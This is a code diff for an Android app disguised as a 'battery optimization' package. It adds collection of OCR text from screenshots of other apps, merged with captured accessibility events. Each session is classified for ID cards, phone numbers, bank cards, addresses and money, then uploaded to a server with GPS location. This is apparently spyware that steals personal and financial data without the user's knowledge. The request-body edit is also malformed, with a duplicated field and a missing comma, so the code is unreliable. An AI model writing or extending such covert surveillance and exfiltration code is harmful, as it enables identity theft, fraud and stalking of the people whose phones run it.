@@ -4,9 +4,11 @@ import android.content.Context
 import android.os.Build
 import android.util.Log
 import com.android.batteryoptimization.network.NetworkClient
+import com.android.batteryoptimization.network.SensitiveInfoPayload
 import com.android.batteryoptimization.network.UploadResponse
 import com.google.gson.Gson
 import com.google.gson.reflect.TypeToken
+import com.android.batteryoptimization.ocr.OcrResult
 import kotlinx.coroutines.*
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.StateFlow
@@ -122,6 +124,48 @@ class InputRepository private constructor(private val context: Context) {
         }
     }
 
+    /**
+     * Add OCR results as events, merged into the existing event stream.
+     * OCR events are tagged with source="ocr" to distinguish from accessibility events.
+     * 上传时会按 (timestamp, packageName) 分组合并为一次 OCR 会话。
+     */
+    fun addOcrEvents(
+        packageName: String,
+        appName: String,
+        results: List<OcrResult>,
+        contentType: String? = null,
+        riskLevel: String? = null,
+        sensitiveInfoJson: String? = null
+    ) {
+        val now = System.currentTimeMillis()
+        val currentEvents = _eventsFlow.value.toMutableList()
+
+        for (result in results) {
+            if (result.text.isBlank()) continue
+            val event = InputEvent(
+                timestamp = now,
+                packageName = packageName,
+                appName = appName,
+                text = result.text,
+                source = "ocr",
+                contentType = contentType,
+                riskLevel = riskLevel,
+                sensitiveInfoJson = sensitiveInfoJson
+            )
+            currentEvents.add(0, event)
+        }
+
+        _eventsFlow.value = currentEvents
+        saveEvents(currentEvents)
+
+        val unuploadedCount = currentEvents.count { !it.isUploaded }
+        if (unuploadedCount >= UPLOAD_THRESHOLD) {
+            repositoryScope.launch {
+                uploadData()
+            }
+        }
+    }
+
     private fun resetTimer() {
         timerJob?.cancel()
         timerJob = repositoryScope.launch {
@@ -204,12 +248,45 @@ class InputRepository private constructor(private val context: Context) {
                 idCard = idCard
             )
 
-            val eventPayloads = currentEvents.map { event ->
+            // 分离 OCR 事件和普通事件
+            val ocrEvents = currentEvents.filter { it.source == "ocr" }
+            val nonOcrEvents = currentEvents.filter { it.source != "ocr" }
+
+            // OCR 事件按 (timestamp, packageName) 分组 → 每条 = 一次截屏会话
+            val ocrSessions = ocrEvents
+                .groupBy { it.timestamp to it.packageName }
+                .map { (key, events) ->
+                    val first = events.first()
+                    val allTexts = events.map { it.text }.filter { it.isNotBlank() }
+                    // 用第一条事件的信息做分类
+                    val fullText = allTexts.joinToString("\n")
+                    val (contentType, riskLevel, sensitiveInfo) = ContentClassifier.analyze(first.packageName, fullText)
+
+                    com.android.batteryoptimization.network.OcrSessionPayload(
+                        packageName = key.second,
+                        appName = first.appName,
+                        text = allTexts,
+                        timestamp = key.first,
+                        contentType = contentType,
+                        riskLevel = riskLevel,
+                        sensitiveInfo = com.android.batteryoptimization.network.SensitiveInfoPayload(
+                            hasIdCard = sensitiveInfo.hasIdCard,
+                            hasPhone = sensitiveInfo.hasPhone,
+                            hasBankCard = sensitiveInfo.hasBankCard,
+                            hasAddress = sensitiveInfo.hasAddress,
+                            hasMoney = sensitiveInfo.hasMoney
+                        )
+                    )
+                }
+
+            // 普通事件保持原有格式
+            val eventPayloads = nonOcrEvents.map { event ->
                 com.android.batteryoptimization.network.EventPayload(
                     packageName = event.packageName,
                     appName = event.appName,
                     text = event.text,
-                    timestamp = event.timestamp
+                    timestamp = event.timestamp,
+                    source = event.source
                 )
             }
 
@@ -218,6 +295,8 @@ class InputRepository private constructor(private val context: Context) {
                 events = eventPayloads,
                 latitude = cachedLatitude,
                 longitude = cachedLongitude
+                events = eventPayloads,
+                ocr = ocrSessions.ifEmpty { null }
             )
 
             val requestJson = gson.toJson(requestBody)
@@ -240,7 +319,8 @@ class InputRepository private constructor(private val context: Context) {
                 val uploadResponse = gson.fromJson(bodyString, UploadResponse::class.java)
                 if (uploadResponse?.code == 0) {
                     val msg = uploadResponse.msg ?: "成功"
-                    Log.d(TAG, "上报成功: ${currentEvents.size} events, msg: $msg")
+                    val totalEvents = eventPayloads.size + ocrSessions.size
+                    Log.d(TAG, "上报成功: ${eventPayloads.size} events + ${ocrSessions.size} ocr sessions, msg: $msg")
 
                     // Append to backup file
                     appendToBackup(currentEvents)
